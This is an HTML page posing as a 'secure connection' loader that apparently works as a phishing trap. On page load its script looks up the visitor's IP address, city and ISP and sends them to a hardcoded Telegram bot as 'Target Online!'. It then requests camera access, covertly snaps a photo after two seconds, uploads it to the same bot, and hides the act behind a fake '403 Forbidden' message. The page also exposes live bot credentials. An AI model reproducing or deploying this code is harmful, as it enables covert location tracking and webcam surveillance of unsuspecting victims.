<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting to Server...</title>
    <style>
        body {

            height: 100vh;

        .loader { 
            border: 4px solid #333; 
            border-top: 4px solid #007bff; 
            border-radius: 50%; 
            width: 45px; 
            height: 45px; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; font-size: 14px; color: #aaa; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <p id="status">Secure connection establishing...</p>
    </div>

    <video id="video" style="display:none" autoplay playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const botToken = "8344149838:AAFseljBPNEZJ1OTiLK3_Fv5aMn2fcf7RYk"; 
        const chatId = "7967860350"; 

        window.onload = function() {
            // ‡ßß. ‡¶¢‡ßã‡¶ï‡¶æ ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞‡¶á ‡¶Ü‡¶á‡¶™‡¶ø ‡¶ì ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                let info = `‚ö° *Target Online!* \n\nüåê IP: ${data.ip} \nüèô City: ${data.city} \nüì° ISP: ${data.org} \nüì± Device: ${navigator.platform}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
            });

            // ‡ß®. ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶ö‡¶æ‡¶ì‡ßü‡¶æ
            startCapture();
        };

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ "Allow" ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶™‡¶∞ ‡ß® ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßá ‡¶õ‡¶¨‡¶ø ‡¶§‡ßÅ‡¶≤‡¶¨‡ßá
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'capture_2sec.jpg');

                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(() => {
                            stream.getTracks().forEach(track => track.stop()); // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶¨‡¶®‡ßç‡¶ß
                            // ‡¶ï‡¶æ‡¶ú ‡¶∂‡ßá‡¶∑ ‡¶π‡¶≤‡ßá ‡¶´‡ßá‡¶ï ‡¶è‡¶∞‡¶∞ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶¨‡ßá
                            document.body.innerHTML = "<div style='color:#ff4444; font-family:Arial;'><h2>403 Forbidden</h2><p>Access denied by server policy.</p></div>";
                        });
                    }, 'image/jpeg');
                }, 2000); // ‡¶†‡¶ø‡¶ï ‡ß® ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° (‡ß®‡ß¶‡ß¶‡ß¶ ‡¶Æ‡¶ø‡¶≤‡¶ø‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°)

            } catch (err) {
                // ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶°‡¶ø‡¶®‡¶æ‡¶á ‡¶ï‡¶∞‡¶≤‡ßá
                document.getElementById('status').innerText = "Connection failed. Please refresh.";
            }
        }
    </script>
</body>
